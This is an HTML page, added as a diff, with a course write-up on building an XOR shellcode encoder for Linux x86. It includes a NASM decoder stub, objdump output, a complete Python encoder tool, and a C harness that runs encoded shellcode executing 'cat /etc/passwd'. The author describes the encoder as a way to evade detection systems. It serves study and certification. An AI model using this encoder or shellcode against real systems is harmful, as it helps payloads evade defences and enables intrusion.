@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each assignment by yourself."><meta property="og:title" content="Assignment N°4 - Shellcode Encoder (NASM)" />
+<meta property="og:description" content="Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each assignment by yourself." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.phrozen.io/docs/linux/slae32/ex4-encoder/" />
+
+<title>Assignment N°4 - Shellcode Encoder (NASM) | Phrozen</title>
+<link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.63abd10f627a7a06406140610b7ce76d028552de10d790fcb09f332349c39047.css" integrity="sha256-Y6vRD2J6egZAYUBhC3znbQKFUt4Q15D8sJ8zI0nDkEc=">
+<script defer src="/en.search.min.20459bf69e2200e22e05e2d462c5c76a0aaf6cd5a2e86247778ba1a2621b0393.js" integrity="sha256-IEWb9p4iAOIuBeLUYsXHagqvbNWi6GJHd4uhomIbA5M="></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-159560668-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script src="https://kit.fontawesome.com/8da36c42cc.js" crossorigin="anonymous"></script>
+  
+</head>
+
+<body>
+  <input type="checkbox" class="hidden" id="menu-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="/"><img src="/logo.svg" alt="Logo" /></a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <span>Microsoft Windows</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/windows/projects/" class="collapsed ">Projects</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/windows/snippets/" class="collapsed ">Snippets</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/windows/poc/" class="collapsed ">PoC</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <span>Linux</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/linux/slae32/" class="collapsed ">SLAE32</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/linux/slae32/ex1-bindshell/" class="">Assignment N°1 - Bindshell (NASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/linux/slae32/ex2-reverseshell/" class="">Assignment N°2 - Reverse Shell (NASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/linux/slae32/ex3-egghunter/" class="">Assignment N°3 - Egg Hunter (C)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/linux/slae32/ex4-encoder/" class="active">Assignment N°4 - Shellcode Encoder (NASM)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Social Networks
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="https://www.linkedin.com/in/jlesueur/" target="_blank" rel="noopener"><i class='fa fa-linkedin'></i>
+        Linkedin
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://www.twitter.com/darkcodersc" target="_blank" rel="noopener"><i class='fa fa-twitter'></i>
+        Twitter
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/DarkCoderSc" target="_blank" rel="noopener"><i class='fa fa-github'></i>
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Other Stuff
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="/disclaimer/disclaimer" target="_blank" rel="noopener">
+        Legal
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Assignment N°4 - Shellcode Encoder (NASM)</strong>
+
+  <label for="toc-control">
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="assignment-goals">Assignment Goals</h1>
+<p><img src="/images/202005/slae32-banner.png" alt="SLAE32" /></p>
+<blockquote class="book-hint warning">
+  <p>This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.</p>
+<p>If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.</p>
+<p>Why? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.</p>
+
+</blockquote>
+
+<ul>
+<li>
+<p>Create a custom encoding scheme.</p>
+</li>
+<li>
+<p>PoC with using execve-stack as the shellcode.</p>
+</li>
+</ul>
+<h1 id="creating-our-own-encoder">Creating our own encoder</h1>
+<p>Shellcode encoders are useful for two main reasons:</p>
+<ul>
+<li>Minimize the risk of getting cough by detection systems.</li>
+<li>Avoid bad characters from our original shellcode.</li>
+</ul>
+<p>An encoder take a shellcode in input and output a different looking shellcode without affecting it functionality.</p>
+<p>The main disadvantage with encoding is that your shellcode size will naturally increase.</p>
+<h2 id="encoder">Encoder</h2>
+<p>The Encoder is generally created using a high level language such as Python / Ruby or C.</p>
+<p>The Encoder scramble the shellcode byte by byte using a reversible routine. Depending on the method used, the Encoder could also put effort on avoiding certain bytes we call bad chars.</p>
+<p>When the shellcode is completely encoded the encoder wraps it inside another shellcode template called the Decoder.</p>
+<h2 id="decoder">Decoder</h2>
+<p>The Decoder reverse the encoding process, When the shellcode is completely decoded, it redirects execution flow at decoded shellcode location.</p>
+<h2 id="xor-encoder-receipe">XOR Encoder Receipe</h2>
+<p>We will create our custom encoder using XOR encryption.</p>
+<p>Each shellcode byte are XORed using a random byte (0-256), In this case the key is not secret and is required by the decoder.</p>
+<p>XOR key needs to be alternate with the encoded shellcode byte.</p>
+<p>Example:</p>
+<p><code>0x01 (Shellcode Pos 1) | 0x02 (XOR Key Pos 1) | 0x03 (Shellcode Pos 2) | 0x04 (XOR Key Pos 2) | ...</code></p>
+<p>The key length then needs to be equal to the shellcode length thus making the process of limiting bad chars much easier but increasing the size of our final payload by two.</p>
+<p>Indeed, to avoid bad characters, if current XOR key position or if XOR operation result is equal to a defined bad char, we need to change the current key position value until we escape all bad chars.</p>
+<p>Decoder OpCodes (represented by one byte or a couple of bytes) can&rsquo;t be placed in bad chars since they are part of the decoding process. They must be white listed.</p>
+<p>We also need to take care of modifying few parts of the decoder on the fly.</p>
+<p>Since decoder browse the shellcode byte by byte, it needs to use the <code>ecx</code> register to create a loop. <code>ecx</code> is obviously equal to the size of our shellcode. So we must patch that value dynamically and cleverly.</p>
+<p>If shellcode length is bellow or equal to 2^8 (256) bytes, then we use <code>cl</code> (8 Bit) register to store loop counter.
+If shellcode length is above 2^8 and bellow or equal to 2^16 (65535) bytes, then we use <code>cx</code> (16 Bit) register to store loop counter.
+Finally if shellcode length is above 2^16 and bellow or equal to 2^32 (4294967296) Bytes, then we use <code>ecx</code> (32 Bit) register to store loop counter.</p>
+<p>Most of the time if not always our shellcode wont cross 65535 bytes but just in case size above this limit is supported.</p>
+<p>Since we are changing OpCode on the fly, we must also relocate addresses for some instructions. We also need to carefully take care of that.</p>
+<h3 id="decoder-template-nasm">Decoder Template (NASM)</h3>
+<pre><code>;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Filename : xor-encoder.nasm                       ;
+; Author   : Jean-Pierre LESUEUR                    ;
+; Website  : https://www.phrozen.io/                ;
+; Email    : jplesueur@phrozen.io                   ;
+; Twitter  : @DarkCoderSc                           ;
+;                                                   ;
+; --------------------------------------------------;
+; SLAE32 Certification Assignement N°3              ;
+; (Pentester Academy).                              ; 
+; https://www.pentesteracademy.com                  ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+global _start
+
+section .text
+;--------------------------------------------------------------------
+; Program Entry Point.
+;--------------------------------------------------------------------
+_start:
+	jmp short get_shellcode
+
+;--------------------------------------------------------------------
+; Decode shellcode with associated key (XOR Decoder).
+;--------------------------------------------------------------------
+decoder:
+	pop esi                     ; Address of EncodedShellcode
+
+	xor ecx, ecx	 	        ; zero ecx
+	xor eax, eax	 		    ; zero eax
+	xor ebx, ebx                ; zero ebx
+
+	mov cl, 0x1                 ; length of our shellcode (EncodedShellcode / 2)
+decode:		
+	mov ah, byte [esi + ebx]
+	mov al, byte [esi + ebx +1]         
+
+	xor ah, al
+
+	mov [esi], ah
+
+	inc ebx
+	inc esi
+
+	loop decode               
+
+	jmp short EncodedShellcode ; run our decoded shellcode
+
+;--------------------------------------------------------------------
+; This section contain our encoded shellcode + XOR key. 
+; It address will be recovered using the Jump Call Pop technique.
+;--------------------------------------------------------------------
+get_shellcode:
+	call decoder
+	EncodedShellcode: db 0x00, 0x00
+</code></pre><h4 id="identified-white-chars">Identified White Chars</h4>
+<p>Each OpCode present in this decoder is designated as a whitelisted char. Since it is required for decoding process it can&rsquo;t be avoided.</p>
+<p>To identify white chars we can compile the Decoder template then use objdump.</p>
+<p>local@user:# <code>nasm -f elf32 -o xor-decoder.o xor-decoder.nasm</code></p>
+<p>local@user:# <code>ld -o xor-decoder xor-decoder.o</code></p>
+<p>local@users:# <code>objdump -d xor-decoder -M intel</code></p>
+<pre><code>xor-decoder:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060:	eb 1a                	jmp    804807c &lt;get_shellcode&gt;
+
+08048062 &lt;decoder&gt;:
+ 8048062:	5e                   	pop    esi
+ 8048063:	31 c9                	xor    ecx,ecx
+ 8048065:	31 c0                	xor    eax,eax
+ 8048067:	31 db                	xor    ebx,ebx
+ 8048069:	b1 01                	mov    cl,0x1
+
+0804806b &lt;decode&gt;:
+ 804806b:	8a 24 1e             	mov    ah,BYTE PTR [esi+ebx*1]
+ 804806e:	8a 44 1e 01          	mov    al,BYTE PTR [esi+ebx*1+0x1]
+ 8048072:	30 c4                	xor    ah,al
+ 8048074:	88 26                	mov    BYTE PTR [esi],ah
+ 8048076:	43                   	inc    ebx
+ 8048077:	46                   	inc    esi
+ 8048078:	e2 f1                	loop   804806b &lt;decode&gt;
+ 804807a:	eb 05                	jmp    8048081 &lt;EncodedShellcode&gt;
+
+0804807c &lt;get_shellcode&gt;:
+ 804807c:	e8 e1 ff ff ff       	call   8048062 &lt;decoder&gt;
+</code></pre><p>Giving:</p>
+<pre><code>0x01, 0x05, 0x1e, 0x24, 0x26, 0x2e, 0x30, 0x31
+0x43, 0x44, 0x46, 0x5e, 0x88, 0x8a, 0xc0, 0xc4
+0xc9, 0xdb, 0xe8, 0xeb, 0xf1, 0xff
+</code></pre><p>as default white char list.</p>
+<p>Remember, depending on the size of our shellcode, we also need to modify on the fly some OpCodes. Resulting OpCode must be also present in white char list.</p>
+<h5 id="shellcode--28">Shellcode (&lt;= 2^8)</h5>
+<pre><code>0xb1, 0x1a
+</code></pre><h5 id="shellcode--28-and--216">Shellcode (&gt; 2^8 and &lt;= 2^16)</h5>
+<pre><code>0x66, 0xb9, 0x1c, 0xdf
+</code></pre><h5 id="shellcode--216-and--232">Shellcode (&gt; 2^16 and &lt;= 2^32&gt;)</h5>
+<pre><code>0xb9, 0x1d, 0xde
+</code></pre><h4 id="shellcode-length-bad-char-subtility">Shellcode Length Bad char subtility</h4>
+<p>There is a last important thing to take in consideration about bad chars.</p>
+<p>When we generate our final decoder payload. We are placing a special OpCode (<code>ecx</code> counter) with the size of our shellcode encoded in hex (Little Endian). This could result in having a new bad char.</p>
+<p>To avoid this problem, we can add an option to append junk OpCode(s) at the end of the shellcode to encode thus varying it size and then OpCode layout.</p>
+<h2 id="xor-encoder-code">XOR Encoder Code</h2>
+<pre><code>#!/usr/bin/python3
+
+'''
+	Jean-Pierre LESUEUR (@DarkCoderSc)
+	jplesueur@phrozen.io
+	https://www.phrozen.io/
+	https://github.com/darkcodersc
+	License : MIT
+	---
+	SLAE32 Assignment 4 : Linux x86-32 Shellcode Encoder.
+	---
+	Description:
+		Encode shellcode using XOR.
+		Support shellcode from any size.
+		Support bad chars.
+'''
+
+import sys
+import random
+from textwrap import wrap
+import argparse
+
+############################################################################################################
+
+verbose = False
+shellcode = None
+encoded_shellcode = None
+
+############################################################################################################
+#
+# Define bad characters and white characters.
+# 
+# white characters are characters used by the decoder itself so it can't be present in bad character array.
+#
+############################################################################################################
+
+#
+# Bad chars list
+#
+default_bad_chars = bytearray([0x00])
+
+bad_chars = None
+
+#
+# Whitelist chars (Can't be in bad chars)
+#
+white_chars_base = bytearray([
+							0x01, 0x05, 0x1e, 0x24, 0x26, 0x2e, 0x30, 0x31,
+						    0x43, 0x44, 0x46, 0x5e, 0x88, 0x8a, 0xc0, 0xc4,
+						    0xc9, 0xdb, 0xe8, 0xeb, 0xf1, 0xff
+						])
+
+white_chars_size8 = bytearray([0xb1, 0x1a])
+
+white_chars_size16 = bytearray([0x66, 0xb9, 0x1c, 0xdf])
+
+white_chars_size32 = bytearray([0xb9, 0x1d, 0xde])
+
+white_chars = None
+
+############################################################################################################
+#
+# Utilities Definitions
+#
+############################################################################################################
+
+#
+# Log Defs
+#
+def success(message):
+    print(&quot;[\033[32m+\033[39m] &quot; + message)
+
+def err(message):
+    print(&quot;[\033[31m-\033[39m] &quot; + message)
+
+def warn(message):
+    print(&quot;[\033[33m!\033[39m] &quot; + message)
+
+def info(message):
+	if verbose:
+		print(&quot;[\033[34m*\033[39m] &quot; + message)
+
+#
+# Convert Byte Array to Byte String
+#
+def bytearr_to_bytestr(data):
+	return ''.join(f&quot;\\x{'{:02x}'.format(x)}&quot; for x in data)
+
+#
+# Convert Byte String to Byte Array
+#
+def bytestr_to_bytearr(data):
+	return list(bytearray.fromhex(data.replace(&quot;\\x&quot;, &quot; &quot;)))
+
+############################################################################################################
+#
+# Prepare Badchar List (Need to be done before calling EncodeShellcode())
+#
+############################################################################################################
+
+def PrepareBadChars(reg_size):
+	global bad_chars
+	global white_chars
+
+	result = True	
+
+	bad_chars = bytearray()
+	white_chars = bytearray()
+
+	if argv.badchars_str:		
+		bad_chars.extend(default_bad_chars)
+		white_chars.extend(white_chars_base)
+
+		if (reg_size == 8):						
+			white_chars.extend(white_chars_size8)
+		elif (reg_size == 16):						
+			white_chars.extend(white_chars_size16)
+		elif (reg_size == 32):
+			white_chars.extend(white_chars_size32)
+
+		for badchar in bytestr_to_bytearr(argv.badchars_str):
+			if (white_chars.find(badchar, 0) == -1):
+				bad_chars.append(badchar)
+			else:
+				warn(f&quot;{hex(badchar)} is whitelisted. It can't be a badchar&quot;)
+
+				result = False
+
+	return result
+
+############################################################################################################
+#
+# Encode Shellcode (XOR) Definition
+#
+############################################################################################################
+
+def EncodeShellcode():
+	global shellcode
+	global encoded_shellcode	
+
+	#
+	# Start encoding
+	#	
+	encoded_shellcode = bytearray()	
+	
+	for opcode in shellcode:	
+		candidates = random.sample(range(255), 255)
+
+		found = False
+		for candidate in candidates:							
+			result = opcode ^ candidate
+			if (bad_chars.find(result, 0) == -1) and (bad_chars.find(candidate, 0) == -1):					
+				found = True
+				break					
+
+		if not found:
+			return False
+
+		encoded_shellcode.append(result)
+		encoded_shellcode.append(candidate)
+
+	return True
+
+############################################################################################################
+#
+# Program Entry Point
+#
+############################################################################################################
+parser = argparse.ArgumentParser(description='Shellcode Xor Encoder (@DarkCoderSc)')
+
+parser.add_argument('-s', action=&quot;store&quot;, dest=&quot;shellcode_str&quot;, required=True, help=&quot;Shellcode to encode (Ex: \\x31\\xe2...\\xeb).&quot;)
+parser.add_argument('-b', action=&quot;store&quot;, dest=&quot;badchars_str&quot;, required=False, help=&quot;Bad chars list (Ex: \\x0a\\x0d), NULL is always a bad char.&quot;)
+parser.add_argument('-v', action=&quot;store_true&quot;, default=False, dest=&quot;verbose&quot;, required=False, help=&quot;Enable verbose.&quot;)
+parser.add_argument('-j', action=&quot;store&quot;, dest=&quot;junk_length&quot;, type=int, default=0, required=False, help=&quot;Append junk opcode at the end of the original shellcode to vary it size.&quot;)
+parser.add_argument('-p', action=&quot;store_true&quot;, default=False, dest=&quot;paranoid_bcheck&quot;, required=False, help=&quot;Check if final payload is really free of badchars (Paranoid mode).&quot;)
+try:
+	argv = parser.parse_args()
+
+	verbose = argv.verbose
+except IOError:
+	parse.error
+
+	sys.exit()
+
+#
+# Setup shellcode array
+#
+shellcode = bytestr_to_bytearr(argv.shellcode_str)
+
+#
+# Optionnaly append junk data at the end to vary shellcode size and avoid bad chars.
+#
+if (argv.junk_length &gt; 0):
+	shellcode.extend(b&quot;\x90&quot;*argv.junk_length)
+
+############################################################################################################
+#
+# Encode and ajust decoder
+# (!) Retry encoding until no bad chars are found in generated opcode (during relocation)
+#
+############################################################################################################
+
+shellcode_length = len(shellcode)
+
+info(f&quot;{shellcode_length} bytes loaded from shellcode to encode.&quot;)
+
+reg_size = 0
+
+if (shellcode_length &lt;= (2**8-1)):	
+	reg_size = 8
+elif (shellcode_length &lt;= (2**16-1)):
+	reg_size = 16
+elif (shellcode_length &lt;= (2**32-1)):
+	reg_size = 32
+
+if (reg_size == 0):
+	err(&quot;Shellcode length is not compatible with our encoder.&quot;)
+
+	sys.exit()
+
+#
+# Prepare Badchars
+#
+info(&quot;Prepare bad chars list...&quot;)
+if not PrepareBadChars(reg_size):
+	err(&quot;Invalid badchar, one or multiple badchar are not compatible with our encoder.&quot;)
+
+	sys.exit()
+
+info(&quot;Done.&quot;)
+
+#
+# Encode Shellcode (XOR)
+#
+info(&quot;Start shellcode encoding...&quot;)
+if not EncodeShellcode():
+	err(&quot;Could not encode shellcode, with current badchar list. Likely reason: to much bad chars.&quot;)
+
+	sys.exit()
+
+info(&quot;Done.&quot;)
+
+# 
+# Upgrade ecx counter / jmp / call relocation.
+#		
+if (reg_size == 8):		
+	counter_opcode = b&quot;\xb1&quot;
+	counter_opcode += shellcode_length.to_bytes(1, byteorder=&quot;little&quot;)
+
+	jmp_get_shellcode_opcode = b&quot;\x1a&quot;
+	call_decoder_opcode = b&quot;\xe1&quot;
+elif (reg_size == 16):
+	counter_opcode = b&quot;\x66\xb9&quot;
+	counter_opcode += shellcode_length.to_bytes(2, byteorder=&quot;little&quot;)
+
+	jmp_get_shellcode_opcode = b&quot;\x1c&quot;
+	call_decoder_opcode = b&quot;\xdf&quot;
+elif (reg_size == 32):		
+	counter_opcode = b&quot;\xb9&quot;
+	counter_opcode += shellcode_length.to_bytes(4, byteorder=&quot;little&quot;)	
+
+	jmp_get_shellcode_opcode = b&quot;\x1d&quot;
+	call_decoder_opcode = b&quot;\xde&quot;	
+
+info(f&quot;counter opcode=[{bytearr_to_bytestr(counter_opcode)}]&quot;)
+info(f&quot;jmp_get_shellcode opcode=[{bytearr_to_bytestr(jmp_get_shellcode_opcode)}]&quot;)
+info(f&quot;call_decoder opcode=[{bytearr_to_bytestr(call_decoder_opcode)}]&quot;)
+
+info(&quot;Checking if additional opcodes now include bad chars...&quot;)
+for opcode in counter_opcode:	
+	if bad_chars.find(opcode) != -1:		
+		err(f&quot;A badchar \&quot;{hex(opcode)}\&quot; was introduced during OpCode generation. Use option \&quot;-j\&quot; to vary shellcode length and try again.&quot;)
+
+		sys.exit()
+
+info(&quot;Done.&quot;)
+
+
+############################################################################################################
+#
+# Build Final Payload
+#
+############################################################################################################
+
+info(&quot;Build our final payload...&quot;)
+
+payload = b&quot;&quot; 
+
+# &lt;_start&gt;:
+payload += b&quot;\xeb&quot;
+payload += jmp_get_shellcode_opcode     # jmp &lt;get_shellcode&gt;
+
+# &lt;decoder&gt;:
+payload += b&quot;\x5e&quot;                      # pop    esi
+payload += b&quot;\x31\xc9&quot;                  # xor    ecx,ecx
+payload += b&quot;\x31\xc0&quot;                  # xor    eax,eax
+payload += b&quot;\x31\xdb&quot;                  # xor    ebx,ebx
+
+payload += counter_opcode				# mov cl|cx|ecx, &lt;EncodedShellcode / 2&gt;
+
+# &lt;decode&gt;:
+payload += b&quot;\x8a\x24\x1e&quot;              # mov    ah,BYTE PTR [esi+ebx*1]
+payload += b&quot;\x8a\x44\x1e\x01&quot;          # mov    al,BYTE PTR [esi+ebx*1+0x1]
+payload += b&quot;\x30\xc4&quot;                  # xor    ah,al    
+payload += b&quot;\x88\x26&quot;                  # mov    BYTE PTR [esi],ah    
+payload += b&quot;\x43&quot;                      # inc    ebx
+payload += b&quot;\x46&quot;                      # inc    esi
+payload += b&quot;\xe2\xf1&quot;                  # loop   &lt;decode&gt;
+payload += b&quot;\xeb\x05&quot;                  # jmp    &lt;EncodedShellcode&gt;
+
+# &lt;get_shellcode&gt;:
+payload += b&quot;\xe8&quot;
+payload += call_decoder_opcode          # call  &lt;decoder&gt;
+payload += b&quot;\xff\xff\xff&quot;
+
+# &lt;EncodedShellcode&gt;:
+payload += bytes(encoded_shellcode)
+
+info(&quot;Done.&quot;)
+
+############################################################################################################
+#
+# Verify if we don't have any badchars (Optional)
+# Should never occurs, if it occurs it means we have a bug somewhere.
+#
+############################################################################################################
+
+if argv.paranoid_bcheck:
+	for opcode in payload:
+		if bad_chars.find(opcode, 0) != -1:
+			err(&quot;Bad char found in final payload. Possible bug affects our encoder.&quot;)
+			sys.exit()
+		
+	
+	success(&quot;Final payload is completely free of bad chars.&quot;)
+
+############################################################################################################
+#
+# Print C array payload to termina. Ready for use (Copy / Paste)
+#
+############################################################################################################
+
+payload_str = bytearr_to_bytestr(payload)
+
+size = int(len(payload_str) / 4)
+
+final_payload = &quot;// Shellcode size = {}\n&quot;.format(size)
+final_payload += &quot;unsigned char code[] = \\\n&quot;
+
+for l in wrap(payload_str, 64):
+	final_payload += &quot;\t\&quot;{}\&quot;\n&quot;.format(l)
+
+final_payload = final_payload[:-1] + &quot;;&quot;
+
+print(f&quot;\n{final_payload}\n&quot;)
+
+success(f&quot;Shellcode successfully encoded, payload size: {size}&quot;)
+</code></pre><h3 id="usage">Usage</h3>
+<ul>
+<li><code>-s</code> : Shellcode to encode (Ex: \x31\xe2&hellip;\xeb).</li>
+<li><code>-b</code> : Bad chars list (Ex: \x0a\x0d), NULL is always a bad char.&quot;)</li>
+<li><code>-v</code> : Enable verbose.</li>
+<li><code>-j</code> : Append junk opcode at the end of the original shellcode to vary it size.</li>
+<li><code>-p</code> : Check if final payload is really free of badchars (Paranoid mode).</li>
+</ul>
+<h3 id="example">Example</h3>
+<p>We will use our <code>cat /etc/passwd</code> shellcode available <a href="https://www.phrozen.io/docs/linux/slae32/ex2-reverseshell/">there</a>.</p>
+<p>local@user:# <code>./xor-encoder.py -s &quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x20\x2f\x65\x74\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe6\x50\x56\x52\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80&quot; -b &quot;\x0a\x0d&quot; -v -p</code></p>
+<p><img src="https://i.ibb.co/J2FLvDK/Screenshot-2020-06-04-at-15-25-39.png" alt="Example Picture" /></p>
+<h4 id="test-encoded-shellcode">Test encoded shellcode</h4>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+// Shellcode size = 173
+unsigned char code[] = \
+        &quot;\xeb\x1a\x5e\x31\xc9\x31\xc0\x31\xdb\xb1\x46\x8a\x24\x1e\x8a\x44&quot;
+        &quot;\x1e\x01\x30\xc4\x88\x26\x43\x46\xe2\xf1\xeb\x05\xe8\xe1\xff\xff&quot;
+        &quot;\xff\x14\x25\x79\xb9\x88\xd8\x56\x3e\x1e\x7c\x3e\x5f\xaf\xdc\xda&quot;
+        &quot;\xb2\xa5\xcd\x6d\x04\x60\x0e\x52\x7d\xb5\x9a\x8f\xe7\xbc\x93\xd2&quot;
+        &quot;\xfd\x4c\x63\x5c\x3e\x06\x8f\x1d\xfe\xf4\x92\x66\xde\xe8\xc5\xd3&quot;
+        &quot;\xb0\xff\xaf\x93\xa2\x62\xa2\x79\xf0\x82\x60\xa2\xf2\xfb\x93\x78&quot;
+        &quot;\x0b\x85\xf6\x26\x51\x5c\x38\xbb\xd3\x79\x1a\x4d\x62\x6a\x1a\xfa&quot;
+        &quot;\x9b\x58\x30\x9b\xbb\x92\xbd\xdb\xbe\x6f\x1b\x1e\x76\xe2\xcd\x3a&quot;
+        &quot;\x59\x09\x68\x58\x2c\xa0\xc8\x4e\x61\x81\xe3\x0f\x66\x10\x7e\xc0&quot;
+        &quot;\x49\x68\x8e\x21\x71\x26\x70\x47\x15\x2c\x7f\xcf\x46\x05\xe4\x11&quot;
+        &quot;\x41\x4b\xc2\x3a\xd8\x28\x98\x41\x4a\x6d\xa0\x16\x96&quot;;
+
+main()
+{
+	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+}
+</code></pre><p>local@user:# <code>gcc shellcode.c -o shellcode -z execstack &amp;&amp; ./shellcode</code></p>
+<p><img src="https://i.ibb.co/0FpGPZR/Screenshot-2020-06-04-at-15-29-03.png" alt="Shellcode Exec" /></p>
+<h1 id="afterword">Afterword</h1>
+<p>Encoder is available in the following Github repository : <a href="https://github.com/DarkCoderSc/slae32-xor-encoder">https://github.com/DarkCoderSc/slae32-xor-encoder</a></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex justify-between">
+
+
+
+
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "phrozen-1" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
